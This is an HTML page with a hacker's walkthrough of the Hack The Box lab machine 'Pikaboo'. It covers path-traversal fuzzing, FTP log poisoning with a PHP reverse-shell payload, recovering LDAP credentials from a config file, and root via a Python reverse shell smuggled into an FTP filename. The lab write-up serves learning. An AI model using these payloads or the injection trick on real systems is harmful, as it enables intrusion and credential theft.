<!DOCTYPE html>
<html lang="en">
<title>Pikaboo Walkthough..</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="index.css">
<head>
   <link rel="shortcut icon" type="image/x-icon" href="favicon_io (1)/favicon.ico" />
</head>

<style>
   body {font-family: "yu gothic"}
   .Slides {display: none}
</style>

<body>
<!-- Navigation bar -->
<div id='nav'>
<ul>
    <li><a href="home.html">Home</a></li>
    <li><a href="home.html#about">About us</a></li>
    <li><a href="home.html#contact">contact us</a></li>
    <li><a href="home.html">Articles</a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
<br><br>
<pre class="ascii-art, animate_ascii"><b>

   -██▓███---▒█████---██▓--██████--▒█████---███▄----█--▒█████---█----██---██████-
   ▓██░--██▒▒██▒--██▒▓██▒▒██----▒-▒██▒--██▒-██-▀█---█-▒██▒--██▒-██--▓██▒▒██----▒-
   ▓██░-██▓▒▒██░--██▒▒██▒░-▓██▄---▒██░--██▒▓██--▀█-██▒▒██░--██▒▓██--▒██░░-▓██▄---
   ▒██▄█▓▒-▒▒██---██░░██░--▒---██▒▒██---██░▓██▒--▐▌██▒▒██---██░▓▓█--░██░--▒---██▒
   ▒██▒-░--░░-████▓▒░░██░▒██████▒▒░-████▓▒░▒██░---▓██░░-████▓▒░▒▒█████▓-▒██████▒▒
   ▒▓▒░-░--░░-▒░▒░▒░-░▓--▒-▒▓▒-▒-░░-▒░▒░▒░-░-▒░---▒-▒-░-▒░▒░▒░-░▒▓▒-▒-▒-▒-▒▓▒-▒-░
   ░▒-░-------░-▒-▒░--▒-░░-░▒--░-░--░-▒-▒░-░-░░---░-▒░--░-▒-▒░-░░▒░-░-░-░-░▒--░-░
   ░░-------░-░-░-▒---▒-░░--░--░--░-░-░-▒-----░---░-░-░-░-░-▒---░░░-░-░-░--░--░--
   -------------░-░---░--------░------░-░-----------░-----░-░-----░-----------░--
   ------------------------------------------------------------------------------
      </b></pre>
   </ul>
   </div>

<!-- image container -->
<div class="image-container"> <!-- beginning of image container -->
   <img src="pikaboo.jpg" style="width:100%" alt="Spider image">
   <pre id="typewriter">
          <span class="string-highlight">MS-DOS version 0.07</span>
          <span class="string-highlight">release 1.01     11/10/83</span><br>
          <span class="string-highlight">C:\> calculating comandline .. DONE</span>
          <span class="string-highlight">C:\> Loading command line .... DONE</span>
          <span class="string-highlight">C:\> type Pikaboo.txt</span>
          <span class="string-highlight">publication date - 17th November 2021/13:13</span>
          <span class="string-highlight">Author - Virgo</span>
          <img src="http://www.hackthebox.eu/badge/image/524661" alt="Hack The Box">
          <span class="string-highlight">system - HTB Pikaboo</span>
          <span class="string-highlight">OS - Linux</span>
          <span class="string-highlight">Difficulty - Hard</span>      
   </pre>
</div> <!-- end of image container -->
<br>

<!-- breakup section -->
<div class="breakup-container"> <!-- beginning of breakup container -->
   <pre class="ascii-art2, animate_ascii"><b>
--------------------------------------------------------------------------------------------------
        \:.             .:/
         \``._________.''/ 
          \             / 
             .--.--, / .':.   .':. \    NTFS...?
/__:  /  | '::' . '::' |
/    /   |`.   ._.   .'|
  / /    |.'         '.|
 /___-_-,|.\  \   /  /.|
      // |''\.;   ;,/ '|
      `==|:=         =:|
         `.          .'
         :-._____.-:
         `''       `''
--------------------------------------------------------------------------------------------------
               </b></pre>
</div> <!-- end of breakup container -->

<!-- article section -->
<div class="article-container"> <!-- beginning of breakup container -->

<!-- space fore article -->
<p class="article-text" style="font-size: 1vw; float: left;">

   <pre>

   -██▓███---██▓-██-▄█▀▄▄▄-------▄▄▄▄----▒█████---▒█████--
   ▓██░--██▒▓██▒-██▄█▒▒████▄----▓█████▄-▒██▒--██▒▒██▒--██▒
   ▓██░-██▓▒▒██▒▓███▄░▒██--▀█▄--▒██▒-▄██▒██░--██▒▒██░--██▒
   ▒██▄█▓▒-▒░██░▓██-█▄░██▄▄▄▄██-▒██░█▀--▒██---██░▒██---██░
   ▒██▒-░--░░██░▒██▒-█▄▓█---▓██▒░▓█--▀█▓░-████▓▒░░-████▓▒░
   ▒▓▒░-░--░░▓--▒-▒▒-▓▒▒▒---▓▒█░░▒▓███▀▒░-▒░▒░▒░-░-▒░▒░▒░-
   ░▒-░------▒-░░-░▒-▒░-▒---▒▒-░▒░▒---░---░-▒-▒░---░-▒-▒░-
   ░░--------▒-░░-░░-░--░---▒----░----░-░-░-░-▒--░-░-░-▒--
   ----------░--░--░--------░--░-░----------░-░------░-░--
   -----------------------------------░-------------------
   ----------------------
   my HTB IP = 10.10.14.138 
   machine (pikaboo) IP = 10.10.10.249
   machine OS = Linux
</pre>

   as such the first thing that i will do
   is running an nmap scan on the ip we find
   all of these ports open:
   
   <pre class="box13">
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
    |   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
    |_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
    80/tcp open  http    nginx 1.14.2
    |_http-server-header: nginx/1.14.2
    |_http-title: Pikaboo
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    </pre>
   
   as such i will first take a look at
   the webpage that we have found, looking
   at it we see that there are a couple of
   different pages relating to collecting
   "pokatmon".
   but one page stands out and this is the
   admin page, which when we press on it gives us
   an error relating to authentication:
   
    Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81
   
   this tells me that there are not only
   extra ports that didnt come up during the scan.
   but that we also have a way to potentially bypass the 
   authentication.
   we will start by fuzz'ing the webpage using 
   wfuzz along with the command of:
   
   <pre class="box13"> 
    wfuzz -u http://10.10.10.249/admin../FUZZ -w usr/share/wordlists/dirb/big.txt -t 200
    
   using this wordlist due to finding what server
   type we are attacking in this case it is apaxhe (debian)
   doing the scan above ^ gives us the result of:
   
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
   
    Target: http://10.10.10.249/admin../FUZZ
    Total requests: 20469
   
    =====================================================================
    ID           Response   Lines    Word       Chars        Payload                                                   
    =====================================================================
   
    000010028:   301        9 L      28 W       314 Ch       "javascript"                                              
    000016215:   200        101 L    299 W      5163 Ch     "server-status"
   
   </pre>
   as such the one that seems interesting is
   "server-status" which we will take a look at to see
   if it will contain any info that we maybe able to use.
   looking at it we find this message under the GET commands:

   <pre class="box13">
    Srv	PID	Acc	M	CPU 	SS	Req	Conn	Child	Slot	Client	VHost	Request
    0-0	668	0/5380/5380	_ 	0.63	354	0	0.0	3.23	3.23 	127.0.0.1	localhost:81	GET /admin_staging HTTP/1.1
   </pre>
   
   this is the one that stood out to me was /admin_staging 
   as such taking a look at this shows us an error.
   but taking another look at the list we find another directory:
   
    http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log
    
   this shows us the logs for an FTP login,
   in this case it shows us the username of login account:
   
    username = pwnmeow
   
   but it also shows a user trying to enter an
   ip as a username , as such we maybe abnle enter
   a command to see if we are able to get a responce
   as such we will try to use it to gain a shell upon 
   the system in question, we will do this using the commands
   bellow:
   
    ftp 10.10.10.249
    
    when asked for a username:
    <pre class="box13">
    ""?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.138/6660 0>&1'");?""
    </pre>
   
   then check chur machine to see if
   the netcat listener on our machine if there
   is a reponse form the machine we are attacking.
   
   this almost doesnt seem to work but taking
   another look towards the site reveals that if we
   curl it aftre doing the commands we may see a connection:
   
    curl http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log
   
   and as such we see a connection and are
   now able to run the normal command of (see below) to
   get a more interactive shell:
   
    python -c 'import pty;pty.spawn("/bin/bash")'
    
   afetr doing this we are able to navigate 
   our ways towards /home/pwnmeow and then grab
   the user.txt flag / token:
   
    user flag / token = d7b0b98f055ac3765d9e5f46ad8ac724
   of course the first thing that we
   try is the comamd of sudo -l, this doesnt give
   us any result atall and looking around the system doesnt seem 
   to give us much that i can see.
   
   as such taking a look upon the interwebs
   we find a command to try an find any metions of passwords:
   
    gerp -iRL 'password'
   
   this directs us towards the file settings.py 
   which is hidden within the config file within /opt/pokiapi
   downloading this to our own system we see that it is using ldap 
   and the secret key:
   <pre class="box13">
   
    "ldap": {
           "ENGINE": "ldapdb.backends.ldap",
           "NAME": "ldap:///",
           "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
           "PASSWORD": "J~42%W?PFHl]g",
   
    "SECRET_KEY", "ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
    </pre>
    
   as such we are able to use this with what we have found in the file to 
   try and find some creds, using the command bellow:
   
   <pre class="box13">
    ldapsearch -D"cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b'dc=pikaboo,dc=htb'
     -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
   </pre>

   doing the above ^ gives us a base64 encode password
   which we should be able to decode using cyberchef or anyother tool:
   
    userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
 
   
   decoding the above to plain text gives us
   the password for our user ftp account upon the 
   system in question:
   
    username = pwnmeow
    password = _G0tT4_C4tcH_'3m_4lL!_
   so for root  i was completely stumped
   and ending up having to look at forums to get
   some hints ast to what to do.
   
   form what i found out we have to create a file upon
   our system using the commabd of:
   
    touch virgo_foxxi
   
   next we sign into the ftp server using the pwnmeow 
   creds before changing to a random directory, in my case berries
   then we have to upload it to the ftp server 
   whilst logged into pwnmeow using the command of:
   
    put *
    
   and then when asked for local enter the file
   name of virgo_foxxi and for remote enter the folowing:
   
   <pre class="box13">
    "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.138\",6660));
    [os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
   </pre>
   after this we should have a netcat listener set up
   and after around and minute we should see a response of 
   root allowing us to gain our root token / flag:
   
    root token / flag = f259819309ef4c73bce0dc658ff9922e
</p>
</div><!-- end of article container -->

<br>
<br>
<!-- Footer Section -->
<div class="footer_container" style="width:100%"> <!-- beginning of Footer container -->
   
</Div> <!-- end of footer container -->
   <div style="background-color: black;"></div>
   <img src="footer reference.PNG" style="width:100%">
</body>
</html>